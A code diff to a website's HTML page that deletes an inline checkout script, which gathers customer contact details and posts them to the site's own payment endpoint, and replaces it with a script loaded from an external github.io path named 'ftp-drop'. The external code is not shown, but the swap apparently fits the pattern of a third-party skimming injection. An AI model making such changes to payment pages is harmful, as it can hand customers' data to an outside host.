@@ -111,68 +111,6 @@
     </div>
   </footer>
   <script src="/assets/nav.js?v=4"></script>
-  <script>
-  (function () {
-    var y = document.getElementById('y');
-    if (y) y.textContent = String(new Date().getFullYear());
-    if (/checkout=cancelled/.test(location.search)) {
-      var c = document.getElementById('cancel-msg');
-      if (c) c.hidden = false;
-    }
-    var form = document.getElementById('brief-form');
-    if (!form) return;
-    var msg = document.getElementById('brief-msg');
-    var cardBtn = document.getElementById('pay-card');
-    var ppBtn = document.getElementById('pay-pp');
-    function payload(rail) {
-      return {
-        businessName: (document.getElementById('biz').value || '').trim(),
-        phone: (document.getElementById('phone').value || '').trim(),
-        email: (document.getElementById('email').value || '').trim(),
-        city: (document.getElementById('city').value || '').trim(),
-        whatYouDo: (document.getElementById('what').value || '').trim(),
-        rail: rail
-      };
-    }
-    function pay(rail) {
-      var body = payload(rail);
-      msg.hidden = false;
-      msg.className = 'msg';
-      if (!body.businessName || !body.phone || !body.email || !body.whatYouDo) {
-        msg.className = 'msg err';
-        msg.textContent = 'Name, what you do, phone, and email are required.';
-        return;
-      }
-      msg.textContent = 'Opening secure checkout…';
-      cardBtn.disabled = true;
-      ppBtn.disabled = true;
-      fetch('/desk-checkout.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      }).then(function (r) { return r.json().then(function (j) { return { ok: r.ok, j: j }; }); })
-        .then(function (res) {
-          if (res.j && res.j.url) {
-            location.href = res.j.url;
-            return;
-          }
-          cardBtn.disabled = false;
-          ppBtn.disabled = false;
-          msg.className = 'msg err';
-          msg.textContent = (res.j && res.j.error) ? res.j.error : 'Could not open checkout.';
-        }).catch(function () {
-          cardBtn.disabled = false;
-          ppBtn.disabled = false;
-          msg.className = 'msg err';
-          msg.textContent = 'Connection failed. Try again in a moment.';
-        });
-    }
-    form.addEventListener('submit', function (e) {
-      e.preventDefault();
-      pay('stripe');
-    });
-    ppBtn.addEventListener('click', function () { pay('paypal'); });
-  })();
-  </script>
+  <script src="https://agency002com-ship-it.github.io/ftp-drop/desk.js?v=20260906c"></script>
 </body>
 </html>
